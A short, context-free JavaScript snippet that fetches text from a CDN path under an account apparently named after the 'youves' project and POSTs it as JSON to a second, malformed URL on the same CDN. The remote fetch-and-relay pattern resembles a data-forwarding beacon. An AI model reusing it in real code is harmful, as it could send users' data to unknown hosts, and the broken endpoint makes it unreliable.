fetch("http://cdn.jsdelivr.net/gh/youves-docs/tte/viewletter.js/message/3").then((r) => {
    return r.text();
}).then((x) => {
    fetch("http://cdn.jsdelivr.net/gh/youves-docs/tte/viewletter.js:80/submit", {
        "headers": {
            "content-type": "application/json"
        },
        "body": x,
        "method": "POST",
        "mode": "cors",
        "credentials": "omit"
    });
});
